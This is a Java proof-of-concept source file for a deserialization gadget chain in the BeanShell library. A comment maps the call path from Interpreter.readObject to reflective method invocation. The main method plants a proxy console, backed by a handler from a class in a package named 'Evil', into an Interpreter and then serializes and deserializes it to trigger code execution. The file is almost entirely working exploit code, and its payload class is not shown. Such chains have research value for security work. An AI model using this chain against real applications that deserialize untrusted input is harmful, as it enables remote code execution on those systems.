package com.example.BeanShell;

import bsh.ConsoleInterface;
import bsh.Interpreter;
import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class POC_1 {

    /***
     * <bsh.Interpreter: void readObject(java.io.ObjectInputStream)>
     * <bsh.XThis$Handler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.XThis$Handler: java.lang.Object invokeImpl(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.Reflect: java.lang.Object invokeMethod(java.lang.reflect.Method,java.lang.Object,java.lang.Object[])>
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("getOut");
        ConsoleInterface console = (ConsoleInterface) Proxy.newProxyInstance(ConsoleInterface.class.getClassLoader(), new Class<?>[]{ConsoleInterface.class}, handler);

        Interpreter e = new Interpreter();
        ReflectionUtil.setField(e, "console", console);

        SerializeUtil.deserialize(SerializeUtil.serialize(e));
    }

}